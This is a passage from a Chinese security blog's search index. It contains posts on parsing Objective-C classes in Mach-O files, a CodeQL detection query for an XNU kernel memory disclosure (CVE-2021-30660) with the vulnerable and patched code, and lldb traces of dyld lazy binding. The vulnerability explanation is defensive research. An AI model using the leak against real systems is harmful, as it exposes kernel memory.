cd_objc2_class objc2Class;objc2Class.isa = [cursor readPtr];objc2Class.superclass = [cursor readPtr];objc2Class.cache = [cursor readPtr];objc2Class.vtable = [cursor readPtr];objc2Class.data = [cursor readPtr];objc2Class.reserved1 = [cursor readPtr];objc2Class.reserved2 = [cursor readPtr];objc2Class.reserved3 = [cursor readPtr]; 也是读取对应的class结构，这个过程其实很眼熟，如果读过iOS逆向的书，比如庆神的书，有一章介绍oc方法调用过程的，会把oc-&gt;cpp代码，那里面这个 oc object的结构分析的很清楚。 然后解析 class-&gt;data 字段 12345678910111213141516struct cd_objc2_class_ro_t objc2ClassData;objc2ClassData.flags = [cursor readInt32];objc2ClassData.instanceStart = [cursor readInt32];objc2ClassData.instanceSize = [cursor readInt32];if ([self.machOFile uses64BitABI]) objc2ClassData.reserved = [cursor readInt32];else objc2ClassData.reserved = 0;objc2ClassData.ivarLayout = [cursor readPtr];objc2ClassData.name = [cursor readPtr];objc2ClassData.baseMethods = [cursor readPtr];objc2ClassData.baseProtocols = [cursor readPtr];objc2ClassData.ivars = [cursor readPtr];objc2ClassData.weakIvarLayout = [cursor readPtr];objc2ClassData.baseProperties = [cursor readPtr]; 然后得到class 的 name，methods，protocol, property信息 然后返回这个class 展开说下 获取 methods &amp;&amp; property的时候 (NSArray *)loadMethodsAtAddress:(uint64_t)address; { return [self loadMethodsAtAddress:address extendedMethodTypesCursor:nil]; } loadMethodsAtAddress : 12345objc2Method.name = [cursor readPtr];objc2Method.types = [cursor readPtr];objc2Method.imp = [cursor readPtr];NSString *name = [self.machOFile stringAtAddress:objc2Method.name];NSString *types = [self.machOFile stringAtAddress:objc2Method.types]; 一样的套路，都是解析出来对应的字段，然后按照这些字段读取信息(string) CDOCMethod *method = [[CDOCMethod alloc] initWithName:name typeString:types address:objc2Method.imp]; [methods addObject:method]; 最后获得methods数组，给前面填充class的地方使用 loadIvarsAtAddress ,loadPropertiesAtAddress , loadMethodsOfMetaClassAtAddress 同理 至此，class解析完毕 6. loadCategories关于Categories 可以看 https://zhuanlan.zhihu.com/p/24925196 处理 __DATA __objc_catlist section : (CDOCCategory *)loadCategoryAtAddress:(uint64_t)address; 一样的处理方法 123456789struct cd_objc2_category objc2Category;objc2Category.name = [cursor readPtr];objc2Category.class = [cursor readPtr];objc2Category.instanceMethods = [cursor readPtr];objc2Category.classMethods = [cursor readPtr];objc2Category.protocols = [cursor readPtr];objc2Category.instanceProperties = [cursor readPtr];objc2Category.v7 = [cursor readPtr];objc2Category.v8 = [cursor readPtr]; 可以看到和对objc2Class的处理有点像，就是因为是category的原因，所以字段有不同， 简单的理解成 处理一种特殊的class，并且提取出相应的 methods 和 properties就行 至此整个 process函数的处理结束 7. 处理 or 输出这部分主要是处理输出了，如果没什么参数就直接stdout输出，如果有指定文件目录，就遍历之前process得到的信息，写文件(.h)到指定的目录。 Referencehttps://zhuanlan.zhihu.com/p/24925196 https://en.wikipedia.org/wiki/Mach-O https://iosre.com/ https://evilpan.com/2020/09/06/macho-inside-out/ iOS应用逆向与安全 (刘培庆著)","link":"/2021/07/11/iOS-RE-4-beginners-1/"},{"title":"ql query for CVE-2021-30660 XNU Kernel Memory Disclosure","text":"CVE-2021-30660 - XNU Kernel Memory Disclosure Vulnmsgsz 可控 msginfo.msgssz 是 8 如果控制 msgsz 不是 8的 整数倍，比如9，就会导致在第二次循环的时候 leak出来 7字节的内核数据。 1234567891011121314151617181920212223242526272829303132next = msghdr-&gt;msg_spot; for (len = 0; len &lt; msgsz; len += msginfo.msgssz) { size_t tlen; /* compare input (size_t) value against restrict (int) value */ if (msgsz &gt; (size_t)msginfo.msgssz) { tlen = msginfo.msgssz; } else { tlen = msgsz; } if (next &lt;= -1) { panic(\"next too low #3\"); } if (next &gt;= msginfo.msgseg) { panic(\"next out of range #3\"); } SYSV_MSG_SUBSYS_UNLOCK(); eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen); SYSV_MSG_SUBSYS_LOCK(); if (eval != 0) {#ifdef MSG_DEBUG_OK printf(\"error (%d) copying out message segment\\\\n\", eval);#endif msg_freehdr(msghdr); wakeup((caddr_t)msqptr); goto msgrcvout; } user_msgp = user_msgp + tlen; /* ptr math */ next = msgmaps[next].next; } Patch1234567891011121314151617for (len = 0; len &lt; msgsz; len += msginfo.msgssz) { size_t tlen; /* * copy the full segment, or less if we're at the end * of the message */ tlen = MIN(msgsz - len, (size_t)msginfo.msgssz); if (next &lt;= -1) { panic(\"next too low #3\"); } if (next &gt;= msginfo.msgseg) { panic(\"next out of range #3\"); } SYSV_MSG_SUBSYS_UNLOCK(); eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen); 补丁保证了，在非8 整数倍的时候，只拷贝剩余的长度的数据。 CodeQL query1234567891011121314151617181920212223242526272829303132333435363738394041424344import cppimport semmle.code.cpp.dataflow.TaintTrackingimport DataFlow::PathGraph// 存在误报 IOKitpredicate isSYSCall(Function f) { exists(Macro m | m.getName().toUpperCase().regexpMatch(\"SYS(.)*\") and m.getLocation().getFile().getBaseName() = \"syscall.h\" and m.getName().indexOf(f.getName()) &gt; 0 )}/*syscall -&gt; copyoutsource : syscall fucntion 's paramssink : copyout 3rd param(size)*/class Config extends TaintTracking::Configuration { Config() { this = \"taint size to copy size\" } override predicate isSource(DataFlow::Node source) { exists(LocalVariable lv, Function f | isSYSCall(f) and lv.getFunction() = f and ( not source.asExpr().(Literal).isConstant() ) and lv.getAnAccess() = source.asExpr() ) } override predicate isSink(DataFlow::Node sink) { exists (FunctionCall fc | fc.getTarget().getName() = \"copyout\" and fc.getArgument(2) = sink.asExpr() ) }}from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sinkwhere cfg.hasFlowPath(source, sink)select source, \" to \", sink, \" in \", source.getNode().getFunction().getName() 有误报，但是够用了，替换成copyin，也可以看看其他的调用路径，不过笔者没发现什么有价值的东西 : ( referenceCVE-2021-30660 - XNU Kernel Memory Disclosure","link":"/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/"},{"title":"iOS RE 4 beginners 2 - 静态链接&amp;&amp;动态链接","text":"ENVmacos11.4 + iphone6 iOS 12.2 静态链接静态链接：输入多个目标文件，输出一个文件（一般是可执行文件）。这个过程中，把多个目标文件里相同性质的段合并到一起。 过程 地址和空间分配 (Address and Storage Allocation) 符号决议 (Symbol Resolution) / 符号绑定 (Symbol Binding) 重定位 (Relocation) 源码123456789101112131415161718~/study/ios_re_link/static_link  cat main.cextern int global_var;int foo(int i);int main(void){ int ret = foo(42 + global_var); return 0;} ~/study/ios_re_link/static_link  cat foo.cint global_var = 0x1337;int foo(int i){ return i + global_var;} 12~/study/ios_re_link/static_link  xcrun -sdk iphoneos clang -c main.c foo.c -target arm64-apple-ios12.2~/study/ios_re_link/static_link  xcrun -sdk iphoneos clang main.o foo.o -o main -target arm64-apple-ios12.2 两个模块(main.o 和 foo.o) 通过静态链接组合成了一个可执行文件(main) 模块&amp;&amp;产物main.o通过machoview可以看到重定位段有三条信息，意味着程序中有三处需要重定位处理： 这个图是hopper反汇编的main函数，可以看到对于引用到其他模块(foo.o)重的变量/函数的地方看起来“正常”，但是点击 bl _foo 就会发现跳转到了： 根据&lt;macho/reloc.h&gt;的定义，可以看到reloc段的结构： 12345678910struct relocation_info { int32_t r_address; /* offset in the section to what is being relocated */ uint32_t r_symbolnum:24, /* symbol index if r_extern == 1 or section ordinal if r_extern == 0 */ r_pcrel:1, /* was relocated pc relative already */ r_length:2, /* 0=byte, 1=word, 2=long, 3=quad */ r_extern:1, /* does not include value of sym referenced */ r_type:4; /* if not 0, machine specific relocation type */}; 结合上面的图来看(以_foo符号为例)： r_address : 0x28 r_symbolnum(24bits): 指向_foo 字符串 剩下的8bits是标志位 对应到汇编里就是，main函数的0x28行引用了 _foo 符号，reloc段把这个信息告知linker，这样在链接的时候linker就会处理这条信息，把对应的符号做替换处理。 foo.o 其实都是对 global_var的引用 在foo.o模块中，是 0x20处的data，这个信息也要告诉linker，在link的阶段做替换。 main最终的可执行文件main，可以看到没有重定位信息，而且mian和foo函数中改替换的符号都已经完成了替换，可以顺利的索引到想要使用的符号(foo和global_var)。 对比两者符号表： 以foo符号为例 : Type 从 N_UNDF → NSECT Value 从0 → 0x100007f90 符号表结构: 123456789struct nlist_64 { union { uint32_t n_strx; /* index into the string table */ } n_un; uint8_t n_type; /* type flag, see below */ uint8_t n_sect; /* section number or NO_SECT */ uint16_t n_desc; /* see &lt;mach-o/stab.h&gt; */ uint64_t n_value; /* value of this symbol (or stab offset) */}; foo 符号的话 string table index : 指向符号的字符串 n_sect : 改符号在第几个section n_value : 符号具体值(地址) 举个🌰这里以demo中 global_var 使用的代码举例子。 源码中: 1int ret = foo(42 + global_var); 如果对应到汇编里应该是: 12345670000000000000014 adrp x9, #0x0 ; 0x68@PAGE0000000000000018 ldr x9, [x9, #0x68] ; 0x68@PAGEOFF000000000000001c ldr w10, [x9]0000000000000020 add w0, w10, #0x2a0000000000000024 str w8, [sp, #0x10 + var_C]0000000000000028 bl _foo 可知 w0 是参数，w10是global_var的值，来自x9 w10 = [x9 + 0x68] (未重定位修复） 最开始索引x9的时候可以发现是把0赋给了x9，因为这里还没有重定位，所以用0代替。 最终的产物中可以看到： 1234560000000100007f64 adrp x9, #0x100008000 ; 0x100008000@PAGE0000000100007f68 add x9, x9, #0x0 ; 0x100008000@PAGEOFF, _global_var0000000100007f6c ldr w10, [x9] ; _global_var0000000100007f70 add w0, w10, #0x2a0000000100007f74 str w8, [sp, #0x10 + var_C]0000000100007f78 bl _foo 把0替换成了 0x100008000，这个地址恰好指向global_var。 可以看到经过linker的处理，可以正确找到global_var，符号foo同理 动态链接debug set up 应该是签名有问题，最终解决方案： 1234567891011/usr/bin/security find-identity -v -p codesigning# get : A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455codesign -s \"A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455\" --entitlements entitlements.xml -f libFoo.dylibcodesign -s \"A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455\" --entitlements entitlements.xml -f main# scp ....# ssh ....mude-iPhone:/tmp root# ./mainmagic is : 49194920 debug lazy binding process 可以看到，第一次调用 printf的时候，bl跳过去并不是 printf函数 12345678910111213141516Target 0: (main) stopped.(lldb) sProcess 1453 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into frame #0: 0x000000010089bf7c main-&gt; 0x10089bf7c: br x16 0x10089bf80: ldr w16, 0x10089bf88 0x10089bf84: b 0x10089bf68 0x10089bf88: udf #0x0Target 0: (main) stopped.(lldb) re re x16 x16 = 0x00000001d858080c libdyld.dylib`dyld_stub_binder(lldb) re re x0 x0 = 0x000000010089bfa4 &quot;magic is : %d\\n&quot;(lldb) re re x1 x1 = 0x0000000000001337 通过 dyld_stub_binder 找 printf的地址，把找到的地址写回到 DATA,__la_symbol_ptr 第二次调用printf的时候就可以看到，这个地方printf函数地址已经被写过来了 123456789101112131415161718(lldb) x/10i $pc-&gt; 0x100dcff60: 0x58000610 ldr x16, #0xc0 ; (void *)0x00000001d860e14c: printf 0x100dcff64: 0xd61f0200 br x16 0x100dcff68: 0x10000611 adr x17, #0xc0 ; _dyld_private 0x100dcff6c: 0xd503201f nop 0x100dcff70: 0xa9bf47f0 stp x16, x17, [sp, #-0x10]! 0x100dcff74: 0xd503201f nop 0x100dcff78: 0x58000490 ldr x16, #0x90 ; (void *)0x00000001d858080c: dyld_stub_binder 0x100dcff7c: 0xd61f0200 br x16 0x100dcff80: 0x18000050 ldr w16, 0x100dcff88 0x100dcff84: 0x17fffff9 b 0x100dcff68(lldb) x/3i $pc-&gt; 0x100dcff60: 0x58000610 ldr x16, #0xc0 ; (void *)0x00000001d860e14c: printf 0x100dcff64: 0xd61f0200 br x16 0x100dcff68: 0x10000611 adr x17, #0xc0 ; _dyld_private(lldb) x/gx $pc+0xc00x100dd0020: 0x00000001d860e14c(lldb) memory region 0x00000001d860e14c 所以这里就可以直接获取到地址，然后直接跳转过去就行: 1234567891011121314151617181920212223(lldb) sProcess 1453 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into frame #0: 0x000000010089bf60 main`printf + 4main`printf:-&gt; 0x10089bf60 &lt;+4&gt;: ldr x16, #0xc0 ; (void *)0x00000001d860e14c: printf 0x10089bf64 &lt;+8&gt;: br x16 0x10089bf68: adr x17, #0xc0 ; _dyld_private 0x10089bf6c: nopTarget 0: (main) stopped.(lldb) sProcess 1453 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into frame #0: 0x000000010089bf64 main`printf + 8main`printf:-&gt; 0x10089bf64 &lt;+8&gt;: br x16 0x10089bf68: adr x17, #0xc0 ; _dyld_private 0x10089bf6c: nop 0x10089bf70: stp x16, x17, [sp, #-0x10]!Target 0: (main) stopped.(lldb) re re x16 x16 = 0x00000001d860e14c libsystem_c.dylib`printf(lldb) libdyld.dylib`dyld_stub_binderdyld-852的代码： 因为我目标环境是iOS12.2，所以具体汇编代码有一些差别： 1234567891011121314151617181920212223242526272829303132Target 0: (main) stopped.(lldb) x/30i $pc-&gt; 0x1d858080c: 0xa9bf7bfd stp x29, x30, [sp, #-0x10]! 0x1d8580810: 0x910003fd mov x29, sp 0x1d8580814: 0xd103c3ff sub sp, sp, #0xf0 ; =0xf0 0x1d8580818: 0xa93f07a0 stp x0, x1, [x29, #-0x10] 0x1d858081c: 0xa93e0fa2 stp x2, x3, [x29, #-0x20] 0x1d8580820: 0xa93d17a4 stp x4, x5, [x29, #-0x30] 0x1d8580824: 0xa93c1fa6 stp x6, x7, [x29, #-0x40] 0x1d8580828: 0xa93b27a8 stp x8, x9, [x29, #-0x50] 0x1d858082c: 0xad3c07a0 stp q0, q1, [x29, #-0x80] 0x1d8580830: 0xad3b0fa2 stp q2, q3, [x29, #-0xa0] 0x1d8580834: 0xad3a17a4 stp q4, q5, [x29, #-0xc0] 0x1d8580838: 0xad391fa6 stp q6, q7, [x29, #-0xe0] 0x1d858083c: 0xf9400fa0 ldr x0, [x29, #0x18] 0x1d8580840: 0xf9400ba1 ldr x1, [x29, #0x10] 0x1d8580844: 0x940004e4 bl 0x1d8581bd4 ; _dyld_fast_stub_entry(void*, long) 0x1d8580848: 0xaa0003f0 mov x16, x0 0x1d858084c: 0xa97f07a0 ldp x0, x1, [x29, #-0x10] 0x1d8580850: 0xa97e0fa2 ldp x2, x3, [x29, #-0x20] 0x1d8580854: 0xa97d17a4 ldp x4, x5, [x29, #-0x30] 0x1d8580858: 0xa97c1fa6 ldp x6, x7, [x29, #-0x40] 0x1d858085c: 0xa97b27a8 ldp x8, x9, [x29, #-0x50] 0x1d8580860: 0xad7c07a0 ldp q0, q1, [x29, #-0x80] 0x1d8580864: 0xad7b0fa2 ldp q2, q3, [x29, #-0xa0] 0x1d8580868: 0xad7a17a4 ldp q4, q5, [x29, #-0xc0] 0x1d858086c: 0xad791fa6 ldp q6, q7, [x29, #-0xe0] 0x1d8580870: 0x910003bf mov sp, x29 0x1d8580874: 0xa8c17bfd ldp x29, x30, [sp], #0x10 0x1d8580878: 0x910043ff add sp, sp, #0x10 ; =0x10 0x1d858087c: 0xd61f0200 br x16 0x1d8580880: 0xd10103ff sub sp, sp, #0x40 ; =0x40 但是本质上是差不多的，影响不大。 下面看看怎么一步一步调用进去，找到所需要的符号 1. call dyld_stub_binder1234567891011121314150000000100007f98 ldr w16, =0x6967616d0000001a0000000100007f9c b 0x100007f68....0000000100007f68 adr x17, #0x100008028 ; CODE XREF=0x100007f84, 0x100007f90, 0x100007f9c// x17-&gt; _dyld_private0000000100007f6c nop0000000100007f70 stp x16, x17, [sp, #-0x10]!0000000100007f74 nop0000000100007f78 ldr x16, #dyld_stub_binder_1000080080000000100007f7c br x16 // call dyld_stub_binder 个人猜测：0x000000000000001a 应该是 类似 linux下elf lazy binding的时候那个index参数的东西，每个符号都不一样 。 初始化好需要的参数就调用进去dyld中去做符号绑定操作了 1234567891011121314151617181920212223(lldb) sProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into frame #0: 0x0000000100fb7f7c main-&gt; 0x100fb7f7c: br x16 0x100fb7f80: ldr w16, 0x100fb7f88 0x100fb7f84: b 0x100fb7f68 0x100fb7f88: udf #0x0Target 0: (main) stopped.(lldb) re re x16 x16 = 0x00000001d858080c libdyld.dylib`dyld_stub_binder(lldb) x/10gx $sp0x16ee4f5a0: 0x000000000000001a 0x0000000100fb80280x16ee4f5b0: 0x0000000000001337 0x00000000000000000x16ee4f5c0: 0x0000000000000000 0x00000000000000010x16ee4f5d0: 0x000000016ee4f5f0 0x00000001d857e8e00x16ee4f5e0: 0x00000001d857e8e0 0x0000000000000000(lldb) re re x0 x0 = 0x0000000100fb7fa4 \"magic is : %d\\n\"(lldb) re re x1 x1 = 0x0000000000001337(lldb) re re x2 x2 = 0x00000000000120a8 2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)保存栈帧，保存当前的寄存器信息(一大堆stp指令，后面符号绑定完成后，ldp会恢复，这些是成对的)，然后设置好参数，就直接转到 dyld::fastBindLazySymbol （函数前面的保存操作看起来和x86上函数开头的保存栈帧 抬高栈給临时变量预留空间的操作差不多） 1234567891011121314Process 1465 resumingProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1 frame #0: 0x00000001d8580844 libdyld.dylib`dyld_stub_binder + 56libdyld.dylib`dyld_stub_binder:-&gt; 0x1d8580844 &lt;+56&gt;: bl 0x1d8581bd4 ; _dyld_fast_stub_entry(void*, long) 0x1d8580848 &lt;+60&gt;: mov x16, x0 0x1d858084c &lt;+64&gt;: ldp x0, x1, [x29, #-0x10] 0x1d8580850 &lt;+68&gt;: ldp x2, x3, [x29, #-0x20]Target 0: (main) stopped.(lldb) re re x0 x0 = 0x0000000100fb8028 _dyld_private(lldb) re re x1 x1 = 0x000000000000001a 调用的是 : fastBindLazySymbol(0x0000000100fb8028, 0x1a) 1234567891011// LINK_EDIT segconst uint8_t* const start = fLinkEditBase + fDyldInfo-&gt;lazy_bind_off;const uint8_t* const end = &amp;start[fDyldInfo-&gt;lazy_bind_size];// ....do{ if ( ! getLazyBindingInfo(lazyBindingInfoOffset, start, end, &amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind) ) dyld::throwf(\"bad lazy bind info\");}while (!doneAfterBind &amp;&amp; !context.strictMachORequired); 对应汇编中： 12345678910111213141516171819(lldb) cProcess 1465 resumingProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.1 frame #0: 0x0000000100fe5e6c dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(unsigned int, ImageLoader::LinkContext const&amp;, void (*)(), void (*)()) + 136dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:-&gt; 0x100fe5e6c &lt;+136&gt;: bl 0x100fe1d98 ; ImageLoaderMachO::getLazyBindingInfo(unsigned int&amp;, unsigned char const*, unsigned char const*, unsigned char*, unsigned long*, int*, char const**, bool*) 0x100fe5e70 &lt;+140&gt;: tbz w0, #0x0, 0x100fe5f80 ; &lt;+412&gt; 0x100fe5e74 &lt;+144&gt;: ldrb w1, [sp, #0x43] 0x100fe5e78 &lt;+148&gt;: ldrb w8, [x20, #0x74]Target 0: (main) stopped.(lldb) re re x1 x1 = 0x0000000100fbc030(lldb) re re x2 x2 = 0x0000000100fbc058(lldb) memory region 0x0000000100fbc030[0x0000000100fbc000-0x0000000100fc0000) r-- __LINKEDIT(lldb) 这里用到了 我这个可执行文件的LINK_EDIT 段去做符号绑定工作： 1234(lldb) image lookup -va $x1 Address: main[0x000000010000c030] (main.__LINKEDIT + 48) Summary: Module: file = \"/private/var/tmp/main\", arch = \"arm64\" 3. ImageLoaderMachO::getLazyBindingInfo根据不同的opcode，走不同分支： 12345678910111213if ( lazyBindingInfoOffset &gt; (lazyInfoEnd-lazyInfoStart) ) return false; bool done = false; const uint8_t* p = &amp;lazyInfoStart[lazyBindingInfoOffset]; while ( !done &amp;&amp; (p &lt; lazyInfoEnd) ) { uint8_t immediate = *p &amp; BIND_IMMEDIATE_MASK; uint8_t opcode = *p &amp; BIND_OPCODE_MASK; ++p; switch (opcode) { }.... 获取目标符号相关的信息 : 1&amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind 然后根据这些信息，获取该符号的地址： 1uintptr_t address = segActualLoadAddress(segIndex) + segOffset; 12345678910111213// dyld版本不一致，实现的函数有些差别，但是本质是一样的(lldb) nProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over frame #0: 0x0000000100fe5ee4 dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(unsigned int, ImageLoader::LinkContext const&amp;, void (*)(), void (*)()) + 256dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:-&gt; 0x100fe5ee4 &lt;+256&gt;: mov x26, x0 0x100fe5ee8 &lt;+260&gt;: mov x0, x20 0x100fe5eec &lt;+264&gt;: bl 0x100fe1fb0 ; ImageLoaderMachO::imageBaseAddress() const 0x100fe5ef0 &lt;+268&gt;: mov x1, x0Target 0: (main) stopped.(lldb) re re x0 x0 = 0x00000001d860e14c libsystem_c.dylib`printf 执行符号绑定： 1result = bindAt(context, this, address, BIND_TYPE_POINTER, symbolName, 0, 0, libraryOrdinal,NULL, \"lazy \", patcher, NULL, true); 1234567891011121314151617181920212223// 调试：frame #0: 0x0000000100fe5f28 dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(unsigned int, ImageLoader::LinkContext const&amp;, void (*)(), void (*)()) + 324dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:-&gt; 0x100fe5f28 &lt;+324&gt;: bl 0x100fe0664 ; ImageLoaderMachO::bindLocation(ImageLoader::LinkContext const&amp;, unsigned long, unsigned long, unsigned long, unsigned char, char const*, long, char const*, char const*, char const*, ImageLoaderMachO::ExtraBindData*, unsigned long) 0x100fe5f2c &lt;+328&gt;: ldrb w8, [sp, #0x27] 0x100fe5f30 &lt;+332&gt;: ldrb w9, [x21, #0x139] 0x100fe5f34 &lt;+336&gt;: orr w8, w8, w9Target 0: (main) stopped.(lldb) re re x0 x0 = 0x00000001010235e0 dyld::gLinkContext(lldb) re re x1 x1 = 0x0000000100000000(lldb) re re x2 x2 = 0x0000000100fb8020 (void *)0x0000000100fb7f98(lldb) re re x3 x3 = 0x00000001d860e14c libsystem_c.dylib`printf(lldb) re re x4 x4 = 0x0000000000000001(lldb) re re x5 x5 = 0x0000000100fbc04e(lldb) re re x6 x6 = 0x0000000000000000(lldb) 执行之后: 1234567891011121314151617(lldb) nProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over frame #0: 0x0000000100fe5f2c dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(unsigned int, ImageLoader::LinkContext const&amp;, void (*)(), void (*)()) + 328dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:-&gt; 0x100fe5f2c &lt;+328&gt;: ldrb w8, [sp, #0x27] 0x100fe5f30 &lt;+332&gt;: ldrb w9, [x21, #0x139] 0x100fe5f34 &lt;+336&gt;: orr w8, w8, w9 0x100fe5f38 &lt;+340&gt;: cbz w8, 0x100fe5e4c ; &lt;+104&gt;Target 0: (main) stopped.(lldb) x/gx 0x0000000100fb80200x100fb8020: 0x00000001d860e14c(lldb) image lookup -va 0x00000001d860e14c Address: libsystem_c.dylib[0x00000001809a614c] (libsystem_c.dylib.__TEXT.__text + 263364) Summary: libsystem_c.dylib`printf Module: file = \"/Users/muhe/Library/Developer/Xcode/iOS DeviceSupport/12.2 (16E227)/Symbols/usr/lib/system/libsystem_c.dylib\", arch = \"arm64\" Symbol: id = {0x00000617}, range = [0x00000001d860e14c-0x00000001d860e1a8), name=\"printf\" 可以看到符号地址已经被写过去了(0x0000000100fb8020) 至此，符号绑定过程完成。 reference《程序员的自我修养-链接、装载和库》 https://juejin.cn/post/6844903912147795982 https://juejin.cn/post/6844903922654511112#heading-10 https://bbs.pediy.com/thread-263907.htm https://iosre.com/t/ios-12-4-killed-9/15633","link":"/2021/07/14/iOS-RE-4-beginners-2/"}],"tags":[{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"Adobe","slug":"Adobe","link":"/tags/Adobe/"},{"name":"PoC","slug":"PoC","link":"/tags/PoC/"},{"name":"linux kernel","slug":"linux-kernel","link":"/tags/linux-kernel/"},{"name":"UaF","slug":"UaF","link":"/tags/UaF/"},{"name":"Apple","slug":"Apple","link":"/tags/Apple/"},{"name":"MacOS","slug":"MacOS","link":"/tags/MacOS/"},{"name":"ctf writeup","slug":"ctf-writeup","link":"/tags/ctf-writeup/"},{"name":"编译原理","slug":"编译原理","link":"/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"name":"Antlr","slug":"Antlr","link":"/tags/Antlr/"},{"name":"Adobe Reader","slug":"Adobe-Reader","link":"/tags/Adobe-Reader/"},{"name":"1day","slug":"1day","link":"/tags/1day/"},{"name":"IDA","slug":"IDA","link":"/tags/IDA/"},{"name":"Bindiff","slug":"Bindiff","link":"/tags/Bindiff/"},{"name":"CTF Writeup","slug":"CTF-Writeup","link":"/tags/CTF-Writeup/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"webkit","slug":"webkit","link":"/tags/webkit/"},{"name":"macOS","slug":"macOS","link":"/tags/macOS/"},{"name":"Adobe Acrobat Reader","slug":"Adobe-Acrobat-Reader","link":"/tags/Adobe-Acrobat-Reader/"},{"name":"IE","slug":"IE","link":"/tags/IE/"},{"name":"office","slug":"office","link":"/tags/office/"},{"name":"vbs","slug":"vbs","link":"/tags/vbs/"},{"name":"v8","slug":"v8","link":"/tags/v8/"},{"name":"exploit","slug":"exploit","link":"/tags/exploit/"},{"name":"chrome","slug":"chrome","link":"/tags/chrome/"},{"name":"CDP","slug":"CDP","link":"/tags/CDP/"},{"name":"Cisco","slug":"Cisco","link":"/tags/Cisco/"},{"name":"life","slug":"life","link":"/tags/life/"},{"name":"PANDA","slug":"PANDA","link":"/tags/PANDA/"},{"name":"RE","slug":"RE","link":"/tags/RE/"},{"name":"Study","slug":"Study","link":"/tags/Study/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"其他","slug":"其他","link":"/tags/%E5%85%B6%E4%BB%96/"},{"name":"环境配置","slug":"环境配置","link":"/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"工具","slug":"工具","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Snell","slug":"Snell","link":"/tags/Snell/"},{"name":"Surge","slug":"Surge","link":"/tags/Surge/"},{"name":"Symbolic Execution","slug":"Symbolic-Execution","link":"/tags/Symbolic-Execution/"},{"name":"感想","slug":"感想","link":"/tags/%E6%84%9F%E6%83%B3/"},{"name":"vuln analysis","slug":"vuln-analysis","link":"/tags/vuln-analysis/"},{"name":"uaf","slug":"uaf","link":"/tags/uaf/"},{"name":"study","slug":"study","link":"/tags/study/"},{"name":"unicorn engine","slug":"unicorn-engine","link":"/tags/unicorn-engine/"},{"name":"tools","slug":"tools","link":"/tags/tools/"},{"name":"Webkit","slug":"Webkit","link":"/tags/Webkit/"},{"name":"windows kernel","slug":"windows-kernel","link":"/tags/windows-kernel/"},{"name":"angr","slug":"angr","link":"/tags/angr/"},{"name":"compiler","slug":"compiler","link":"/tags/compiler/"},{"name":"fuzz","slug":"fuzz","link":"/tags/fuzz/"},{"name":"peach","slug":"peach","link":"/tags/peach/"},{"name":"winafl","slug":"winafl","link":"/tags/winafl/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"IPC","slug":"IPC","link":"/tags/IPC/"},{"name":"Mach","slug":"Mach","link":"/tags/Mach/"},{"name":"ESXi","slug":"ESXi","link":"/tags/ESXi/"},{"name":"debug","slug":"debug","link":"/tags/debug/"},{"name":"mips","slug":"mips","link":"/tags/mips/"},{"name":"wargame","slug":"wargame","link":"/tags/wargame/"},{"name":"ret 2 dl-resolve","slug":"ret-2-dl-resolve","link":"/tags/ret-2-dl-resolve/"},{"name":"env","slug":"env","link":"/tags/env/"},{"name":"config","slug":"config","link":"/tags/config/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"Tools","slug":"Tools","link":"/tags/Tools/"},{"name":"Frida","slug":"Frida","link":"/tags/Frida/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"Compilers","slug":"Compilers","link":"/tags/Compilers/"},{"name":"paper","slug":"paper","link":"/tags/paper/"},{"name":"感悟","slug":"感悟","link":"/tags/%E6%84%9F%E6%82%9F/"},{"name":"LLVM","slug":"LLVM","link":"/tags/LLVM/"},{"name":"frida","slug":"frida","link":"/tags/frida/"},{"name":"glibc内存管理","slug":"glibc内存管理","link":"/tags/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"shellcode","slug":"shellcode","link":"/tags/shellcode/"},{"name":"XNU","slug":"XNU","link":"/tags/XNU/"},{"name":"CodeQL","slug":"CodeQL","link":"/tags/CodeQL/"},{"name":"iOS","slug":"iOS","link":"/tags/iOS/"},{"name":"Chrome","s